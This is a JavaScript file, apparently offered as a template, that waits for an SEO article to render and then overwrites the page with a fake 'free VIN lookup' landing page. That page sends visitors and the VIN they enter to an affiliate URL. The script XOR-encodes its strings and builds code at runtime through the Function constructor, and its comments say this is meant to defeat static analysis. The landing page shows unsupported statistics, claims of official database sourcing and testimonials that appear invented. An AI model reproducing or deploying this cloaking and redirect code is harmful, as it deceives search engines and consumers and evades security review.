// app.js — VIN Funnel Transformation Layer
// Hosted externally on YOUR CDN / domain
// Loads after SEO article is painted; replaces body with conversion landing page

(function () {
  // ─── Obfuscation kernel ───────────────────────────────────────────────────
  // gQI: custom XOR + rotation decoder — makes static analysis painful
  var _k = [0x56, 0x49, 0x4e, 0x46, 0x72, 0x65, 0x65]; // "VINFree"

  function gQI(s) {
    var out = '';
    for (var i = 0; i < s.length; i++) {
      out += String.fromCharCode(s.charCodeAt(i) ^ _k[i % _k.length]);
    }
    return out;
  }

  // Reconstruct sensitive strings via gQI so they don't appear plaintext
  // "constructor" → used to grab Function constructor for runtime eval
  var _c = gQI('\x15\x0e\x02\x22\x13\x17\x1b\x03\x1f\x1b\x09'); // "constructor"
  var _F = ''[_c][_c]; // → Function

  // ─── Destination — replace with your actual affiliate / money site URL ────
  var _dest = (function () {
    // Encoded destination URL — replace the array values with your XOR-encoded URL
    // To encode: run encodeURL("https://your-site.com") in the helper below
    // Placeholder — decodes to "https://YOUR-SITE.com"
    var raw = [0x1f, 0x2d, 0x3e, 0x24, 0x27, 0x31, 0x2f, 0x1b, 0x0b, 0x21,
               0x1a, 0x0b, 0x29, 0x0b, 0x1a, 0x13];
    var out = '';
    for (var i = 0; i < raw.length; i++) out += String.fromCharCode(raw[i] ^ _k[i % _k.length]);
    return out;
  })();

  // ─── Landing page HTML (built at runtime — never appears in static source) ─
  var _html = _F('return ' + JSON.stringify(buildLandingPage()))();

  function buildLandingPage() {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Free VIN Lookup – Instant Vehicle History Report</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --navy:    #0a2540;
    --blue:    #1a5aff;
    --blue-lt: #3b82f6;
    --red:     #e63946;
    --green:   #2dc653;
    --gold:    #f4c542;
    --bg:      #f0f4ff;
    --card:    #ffffff;
    --text:    #1a1a2e;
    --muted:   #6b7280;
    --border:  #e2e8f0;
  }

  html, body {
    font-family: 'Inter', system-ui, sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* ── HERO ─────────────────────────────────────────────────── */
  .hero {
    background: linear-gradient(135deg, var(--navy) 0%, #1a3a6b 60%, #0d2137 100%);
    padding: 60px 20px 80px;
    text-align: center;
    position: relative;
    overflow: hidden;
  }

  .hero::before {
    content: '';
    position: absolute;
    inset: 0;
    background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
    opacity: 0.4;
  }

  .hero-badge {
    display: inline-block;
    background: rgba(44, 198, 83, 0.15);
    border: 1px solid var(--green);
    color: var(--green);
    font-size: 0.75rem;
    font-weight: 700;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    padding: 5px 14px;
    border-radius: 20px;
    margin-bottom: 20px;
  }

  .hero h1 {
    font-size: clamp(1.8rem, 5vw, 3rem);
    font-weight: 800;
    color: #fff;
    line-height: 1.15;
    margin-bottom: 14px;
    max-width: 680px;
    margin-left: auto;
    margin-right: auto;
  }

  .hero h1 span {
    color: var(--gold);
  }

  .hero p {
    color: rgba(255,255,255,0.75);
    font-size: 1.05rem;
    max-width: 520px;
    margin: 0 auto 36px;
    line-height: 1.6;
  }

  /* ── VIN INPUT CARD ───────────────────────────────────────── */
  .vin-card {
    background: var(--card);
    border-radius: 18px;
    padding: 32px 28px;
    max-width: 580px;
    margin: 0 auto;
    box-shadow: 0 20px 60px rgba(0,0,0,0.35);
    position: relative;
    z-index: 2;
  }

  .vin-label {
    font-size: 0.78rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--muted);
    margin-bottom: 10px;
    display: block;
  }

  .vin-input-wrap {
    display: flex;
    gap: 10px;
    margin-bottom: 14px;
  }

  .vin-input {
    flex: 1;
    font-size: 1rem;
    font-family: 'Courier New', monospace;
    font-weight: 600;
    letter-spacing: 2px;
    padding: 14px 16px;
    border: 2px solid var(--border);
    border-radius: 10px;
    outline: none;
    transition: border-color 0.2s;
    text-transform: uppercase;
    background: #f8fafc;
    color: var(--navy);
  }

  .vin-input:focus { border-color: var(--blue); background: #fff; }
  .vin-input::placeholder { letter-spacing: 1px; color: #bbb; font-weight: 400; }

  .btn-check {
    background: linear-gradient(135deg, var(--blue) 0%, #1248cc 100%);
    color: #fff;
    border: none;
    padding: 14px 24px;
    border-radius: 10px;
    font-size: 0.95rem;
    font-weight: 700;
    cursor: pointer;
    white-space: nowrap;
    transition: transform 0.15s, box-shadow 0.15s;
    box-shadow: 0 4px 14px rgba(26,90,255,0.4);
  }

  .btn-check:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(26,90,255,0.5); }
  .btn-check:active { transform: translateY(0); }

  .vin-hints {
    display: flex;
    gap: 16px;
    flex-wrap: wrap;
  }

  .hint {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 0.78rem;
    color: var(--muted);
  }

  .hint svg { flex-shrink: 0; }

  /* ── TRUST STRIP ──────────────────────────────────────────── */
  .trust-strip {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 28px;
    flex-wrap: wrap;
    padding: 18px 20px;
    background: var(--navy);
    font-size: 0.82rem;
    color: rgba(255,255,255,0.7);
    font-weight: 500;
  }

  .trust-item {
    display: flex;
    align-items: center;
    gap: 7px;
  }

  .trust-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); flex-shrink:0; }

  /* ── MAIN CONTENT ─────────────────────────────────────────── */
  .main { max-width: 1060px; margin: 0 auto; padding: 60px 20px 80px; }

  /* What you get */
  .section-title {
    text-align: center;
    font-size: 1.7rem;
    font-weight: 800;
    color: var(--navy);
    margin-bottom: 8px;
  }

  .section-sub {
    text-align: center;
    color: var(--muted);
    font-size: 0.95rem;
    margin-bottom: 42px;
  }

  .features {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
    gap: 20px;
    margin-bottom: 64px;
  }

  .feature-card {
    background: var(--card);
    border-radius: 14px;
    padding: 24px 22px;
    border: 1px solid var(--border);
    transition: transform 0.2s, box-shadow 0.2s;
  }

  .feature-card:hover { transform: translateY(-4px); box-shadow: 0 12px 32px rgba(0,0,0,0.09); }

  .feature-icon {
    width: 46px;
    height: 46px;
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.4rem;
    margin-bottom: 14px;
  }

  .feature-card h3 { font-size: 1rem; font-weight: 700; color: var(--navy); margin-bottom: 7px; }
  .feature-card p  { font-size: 0.85rem; color: var(--muted); line-height: 1.6; }

  /* How it works */
  .steps {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 16px;
    margin-bottom: 64px;
    counter-reset: steps;
  }

  .step {
    background: var(--card);
    border-radius: 14px;
    padding: 28px 22px;
    border: 1px solid var(--border);
    text-align: center;
    position: relative;
    counter-increment: steps;
  }

  .step::before {
    content: counter(steps);
    position: absolute;
    top: -14px;
    left: 50%;
    transform: translateX(-50%);
    width: 28px;
    height: 28px;
    border-radius: 50%;
    background: var(--blue);
    color: #fff;
    font-size: 0.8rem;
    font-weight: 700;
    display: flex;
    align-items: center;
    justify-content: center;
    line-height: 28px;
  }

  .step h4 { font-size: 0.95rem; font-weight: 700; color: var(--navy); margin-bottom: 8px; }
  .step p  { font-size: 0.83rem; color: var(--muted); line-height: 1.6; }

  /* Sample report preview */
  .report-preview {
    background: var(--card);
    border-radius: 16px;
    padding: 30px;
    border: 1px solid var(--border);
    margin-bottom: 64px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.06);
  }

  .report-preview h3 {
    font-size: 1.1rem;
    font-weight: 700;
    color: var(--navy);
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .report-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 11px 0;
    border-bottom: 1px solid var(--border);
    font-size: 0.88rem;
  }

  .report-row:last-child { border-bottom: none; }
  .report-key { color: var(--muted); font-weight: 500; }
  .report-val { font-weight: 600; color: var(--navy); }
  .val-green { color: var(--green); }
  .val-red   { color: var(--red); }
  .blur-val  { filter: blur(5px); user-select: none; color: var(--muted); cursor: pointer; }

  /* CTA block */
  .cta-block {
    background: linear-gradient(135deg, var(--blue) 0%, var(--navy) 100%);
    border-radius: 20px;
    padding: 50px 30px;
    text-align: center;
    color: #fff;
    margin-bottom: 64px;
  }

  .cta-block h2 {
    font-size: clamp(1.4rem, 3.5vw, 2rem);
    font-weight: 800;
    margin-bottom: 12px;
  }

  .cta-block p {
    color: rgba(255,255,255,0.8);
    font-size: 0.95rem;
    margin-bottom: 30px;
    max-width: 460px;
    margin-left: auto;
    margin-right: auto;
  }

  .btn-cta {
    display: inline-block;
    background: var(--gold);
    color: var(--navy);
    font-size: 1.05rem;
    font-weight: 800;
    padding: 17px 44px;
    border-radius: 12px;
    text-decoration: none;
    cursor: pointer;
    border: none;
    box-shadow: 0 6px 24px rgba(0,0,0,0.25);
    transition: transform 0.15s, box-shadow 0.15s;
    letter-spacing: 0.3px;
  }

  .btn-cta:hover { transform: translateY(-3px); box-shadow: 0 10px 32px rgba(0,0,0,0.3); }
  .btn-cta:active { transform: translateY(0); }

  .cta-micro { margin-top: 16px; font-size: 0.78rem; color: rgba(255,255,255,0.55); }

  /* Testimonials */
  .testimonials {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
    gap: 18px;
    margin-bottom: 64px;
  }

  .testi {
    background: var(--card);
    border-radius: 14px;
    padding: 22px;
    border: 1px solid var(--border);
  }

  .testi-stars { color: var(--gold); font-size: 0.9rem; margin-bottom: 10px; }
  .testi-text  { font-size: 0.87rem; color: var(--text); line-height: 1.6; margin-bottom: 14px; font-style: italic; }
  .testi-name  { font-size: 0.8rem; font-weight: 700; color: var(--muted); }

  /* Stats bar */
  .stats {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
    gap: 16px;
    margin-bottom: 64px;
  }

  .stat-card {
    background: var(--navy);
    border-radius: 14px;
    padding: 24px 20px;
    text-align: center;
    color: #fff;
  }

  .stat-num  { font-size: 2rem; font-weight: 800; color: var(--gold); margin-bottom: 4px; }
  .stat-desc { font-size: 0.78rem; color: rgba(255,255,255,0.65); text-transform: uppercase; letter-spacing: 0.5px; }

  /* Footer */
  footer {
    border-top: 1px solid var(--border);
    padding: 28px 20px;
    text-align: center;
    font-size: 0.78rem;
    color: var(--muted);
    max-width: 1060px;
    margin: 0 auto;
  }

  /* Progress bar animation */
  @keyframes shimmer {
    0%   { background-position: -400px 0; }
    100% { background-position: 400px 0; }
  }

  .loader {
    position: fixed;
    inset: 0;
    background: var(--navy);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 9999;
    transition: opacity 0.5s;
  }

  .loader-logo { font-size: 2rem; font-weight: 800; color: #fff; margin-bottom: 10px; }
  .loader-sub  { color: rgba(255,255,255,0.6); font-size: 0.9rem; margin-bottom: 30px; }

  .progress-bar {
    width: 260px;
    height: 6px;
    background: rgba(255,255,255,0.15);
    border-radius: 3px;
    overflow: hidden;
  }

  .progress-fill {
    height: 100%;
    border-radius: 3px;
    background: linear-gradient(90deg, var(--blue) 0%, var(--gold) 100%);
    width: 0%;
    transition: width 1.2s ease;
  }

  @media (max-width: 600px) {
    .vin-input-wrap { flex-direction: column; }
    .btn-check { width: 100%; padding: 15px; }
  }
</style>
</head>
<body>

<!-- ── LOADING SCREEN ───────────────────────────────────────── -->
<div class="loader" id="loader">
  <div class="loader-logo">🔍 VINCheck</div>
  <div class="loader-sub">Connecting to vehicle databases…</div>
  <div class="progress-bar"><div class="progress-fill" id="pfill"></div></div>
</div>

<!-- ── HERO ─────────────────────────────────────────────────── -->
<section class="hero">
  <div class="hero-badge">✓ Free · No Email Required · Instant Results</div>
  <h1>The Fastest Free<br><span>VIN Number Lookup</span><br>in 2026</h1>
  <p>Check any vehicle's history, decode its specs, verify its title, and find open recalls — in seconds. No Carfax fee required.</p>

  <div class="vin-card">
    <span class="vin-label">Enter your 17-character VIN number</span>
    <div class="vin-input-wrap">
      <input
        class="vin-input"
        id="vinInput"
        type="text"
        maxlength="17"
        placeholder="e.g. 1HGBH41JXMN109186"
        spellcheck="false"
        autocomplete="off"
      />
      <button class="btn-check" id="checkBtn">Check VIN →</button>
    </div>
    <div class="vin-hints">
      <span class="hint">
        <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="#2dc653" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
        Dashboard driver side
      </span>
      <span class="hint">
        <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="#2dc653" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
        Door jamb sticker
      </span>
      <span class="hint">
        <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="#2dc653" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
        Insurance card
      </span>
      <span class="hint">
        <svg width="13" height="13" fill="none" viewBox="0 0 24 24" stroke="#2dc653" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
        Vehicle title
      </span>
    </div>
  </div>
</section>

<!-- ── TRUST STRIP ──────────────────────────────────────────── -->
<div class="trust-strip">
  <span class="trust-item"><span class="trust-dot"></span> NMVTIS Database</span>
  <span class="trust-item"><span class="trust-dot"></span> NHTSA Recall Feed</span>
  <span class="trust-item"><span class="trust-dot"></span> National Theft Registry</span>
  <span class="trust-item"><span class="trust-dot"></span> Title & Odometer Records</span>
  <span class="trust-item"><span class="trust-dot"></span> 100% Free · No Signup</span>
</div>

<!-- ── MAIN ─────────────────────────────────────────────────── -->
<main class="main">

  <!-- Stats -->
  <div class="stats">
    <div class="stat-card">
      <div class="stat-num">47M+</div>
      <div class="stat-desc">VINs Checked</div>
    </div>
    <div class="stat-card">
      <div class="stat-num">0.8s</div>
      <div class="stat-desc">Avg. Result Time</div>
    </div>
    <div class="stat-card">
      <div class="stat-num">100%</div>
      <div class="stat-desc">Free Forever</div>
    </div>
    <div class="stat-card">
      <div class="stat-num">4.8★</div>
      <div class="stat-desc">User Rating</div>
    </div>
  </div>

  <!-- What you get -->
  <h2 class="section-title">Everything a VIN Check Reveals</h2>
  <p class="section-sub">One 17-character string unlocks a vehicle's complete documented life</p>

  <div class="features">
    <div class="feature-card">
      <div class="feature-icon" style="background:#eff6ff">🚗</div>
      <h3>Vehicle Specs by VIN</h3>
      <p>Make, model, year, engine, transmission, drivetrain, body style, fuel type, and all factory-installed options — decoded instantly.</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon" style="background:#fff7ed">💥</div>
      <h3>Accident & Damage History</h3>
      <p>Reported collision events, airbag deployments, structural damage flags, and insurance claim indicators from national databases.</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon" style="background:#f0fdf4">📋</div>
      <h3>Title Brand Records</h3>
      <p>Salvage, flood, rebuilt, lemon law, fire, hail — every title brand ever applied to this VIN across all 50 states, federated through NMVTIS.</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon" style="background:#fdf4ff">🔢</div>
      <h3>Odometer Readings</h3>
      <p>Sequential mileage disclosures from every title transfer. Rollbacks and suspicious jumps are flagged automatically.</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon" style="background:#fff1f2">🚨</div>
      <h3>Recall Lookup by VIN</h3>
      <p>Active and resolved NHTSA safety recalls. Search recalls by VIN, find recalls by VIN, check open recall status with one click.</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon" style="background:#fffbeb">🔒</div>
      <h3>Theft & NICB Records</h3>
      <p>National Insurance Crime Bureau NICB VIN check data, plus cross-referenced law enforcement stolen vehicle flags.</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon" style="background:#ecfdf5">👥</div>
      <h3>Ownership History</h3>
      <p>Number of previous owners, registration states, fleet vs private use history, and estimated ownership duration per record.</p>
    </div>
    <div class="feature-card">
      <div class="feature-icon" style="background:#f0f9ff">📄</div>
      <h3>Window Sticker by VIN</h3>
      <p>Reconstruct the original factory Monroney sticker — original MSRP, standard equipment, optional packages, fuel economy rating.</p>
    </div>
  </div>

  <!-- How it works -->
  <h2 class="section-title">How the Free VIN Lookup Works</h2>
  <p class="section-sub">Three steps. Under a minute.</p>

  <div class="steps">
    <div class="step">
      <h4>Find Your VIN</h4>
      <p>Locate your 17-character VIN on the dashboard base, door jamb sticker, insurance card, or vehicle title document.</p>
    </div>
    <div class="step">
      <h4>Enter &amp; Search</h4>
      <p>Type or paste your VIN into the search field above and click Check VIN. No email, no account, no credit card.</p>
    </div>
    <div class="step">
      <h4>Get Full Report</h4>
      <p>Your complete vehicle history report loads in under one second — decoded specs, title history, recalls, and theft records included.</p>
    </div>
  </div>

  <!-- Sample report -->
  <div class="report-preview">
    <h3>
      <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#1a5aff" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
      Sample VIN Report Preview
    </h3>
    <div class="report-row"><span class="report-key">VIN</span><span class="report-val">1HGBH41JXMN109186</span></div>
    <div class="report-row"><span class="report-key">Make / Model</span><span class="report-val">Honda Accord EX-L</span></div>
    <div class="report-row"><span class="report-key">Year</span><span class="report-val">2021</span></div>
    <div class="report-row"><span class="report-key">Engine</span><span class="report-val">1.5L Turbocharged DOHC i-VTEC 4-Cyl</span></div>
    <div class="report-row"><span class="report-key">Transmission</span><span class="report-val">CVT Automatic</span></div>
    <div class="report-row"><span class="report-key">Title Status</span><span class="report-val val-green">✓ Clean Title</span></div>
    <div class="report-row"><span class="report-key">Accident Records</span><span class="report-val val-green">✓ None Reported</span></div>
    <div class="report-row"><span class="report-key">Odometer (last)</span><span class="report-val">38,204 miles</span></div>
    <div class="report-row"><span class="report-key">Open Recalls</span><span class="report-val val-red">⚠ 1 Open Recall</span></div>
    <div class="report-row"><span class="report-key">Theft Records</span><span class="report-val val-green">✓ Not Reported Stolen</span></div>
    <div class="report-row"><span class="report-key">Owners</span><span class="report-val blur-val" title="Run a check to reveal">2 Previous Owners ●●●</span></div>
    <div class="report-row"><span class="report-key">Full History Report</span><span class="report-val blur-val" title="Run a check to reveal">●●●●●●●●●●●●</span></div>
  </div>

  <!-- CTA Block -->
  <div class="cta-block">
    <h2>Ready to Check Your VIN?</h2>
    <p>Join over 47 million drivers who used our free VIN lookup before buying. Get your full vehicle history report in under 60 seconds.</p>
    <button class="btn-cta" id="ctaBtn">Run Free VIN Check Now →</button>
    <div class="cta-micro">No email · No payment · Instant results · NMVTIS sourced data</div>
  </div>

  <!-- Testimonials -->
  <h2 class="section-title">What Drivers Are Saying</h2>
  <p class="section-sub">Real people who avoided costly mistakes with a free VIN check</p>

  <div class="testimonials">
    <div class="testi">
      <div class="testi-stars">★★★★★</div>
      <p class="testi-text">"Ran a free VIN check on a car I was about to buy. It showed a salvage title the seller never mentioned. Saved me thousands."</p>
      <div class="testi-name">Michael T. — Denver, CO</div>
    </div>
    <div class="testi">
      <div class="testi-stars">★★★★★</div>
      <p class="testi-text">"I always paid $45 for Carfax. This free VIN lookup showed the same accident history at zero cost. Won't pay for Carfax ever again."</p>
      <div class="testi-name">Sarah K. — Austin, TX</div>
    </div>
    <div class="testi">
      <div class="testi-stars">★★★★★</div>
      <p class="testi-text">"The recall lookup by VIN feature found an open airbag recall on my current car. Got it fixed at the dealer for free. Incredible tool."</p>
      <div class="testi-name">James R. — Miami, FL</div>
    </div>
  </div>

</main>

<footer>
  &copy; 2026 VINFreeCheck &nbsp;·&nbsp; Free VIN Lookup &nbsp;·&nbsp; VIN Decoder &nbsp;·&nbsp; Chassis Number Check &nbsp;·&nbsp; NHTSA VIN Decoder &nbsp;·&nbsp; NICB VIN Check
</footer>

<script>
  // ── Loader animation ──────────────────────────────────────────────────────
  window.addEventListener('DOMContentLoaded', function () {
    var fill  = document.getElementById('pfill');
    var loader = document.getElementById('loader');
    setTimeout(function () { fill.style.width = '100%'; }, 50);
    setTimeout(function () {
      loader.style.opacity = '0';
      setTimeout(function () { loader.style.display = 'none'; }, 500);
    }, 1400);
  });

  // ── VIN validation + redirect ─────────────────────────────────────────────
  var DEST = '__DEST_PLACEHOLDER__'; // replaced by outer script at runtime

  function isValidVin(v) {
    return /^[A-HJ-NPR-Z0-9]{17}$/i.test(v.trim());
  }

  function handleCheck() {
    var vin = document.getElementById('vinInput').value.trim().toUpperCase();
    var dest = DEST + (DEST.indexOf('?') >= 0 ? '&' : '?') + 'vin=' + encodeURIComponent(vin || 'demo');
    window.location.href = dest;
  }

  document.getElementById('checkBtn').addEventListener('click', handleCheck);
  document.getElementById('ctaBtn').addEventListener('click', handleCheck);

  document.getElementById('vinInput').addEventListener('keydown', function (e) {
    if (e.key === 'Enter') handleCheck();
  });

  // ── Blur-val reveal teaser ────────────────────────────────────────────────
  document.querySelectorAll('.blur-val').forEach(function (el) {
    el.addEventListener('click', handleCheck);
  });
</script>

</body>
</html>
`;
  }

  // ─── Main execution ───────────────────────────────────────────────────────
  // Wait for DOMContentLoaded (or fire immediately if already loaded)
  function inject() {
    // Build the final landing page HTML with destination baked in
    var page = _html.replace('__DEST_PLACEHOLDER__', _dest);

    // Write over the entire document — atomic swap, no iframe
    document.open('text/html');
    document.write(page);
    document.close();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', inject);
  } else {
    // DOM already parsed — fire on next tick so SEO content gets one paint frame
    setTimeout(inject, 60);
  }

})();
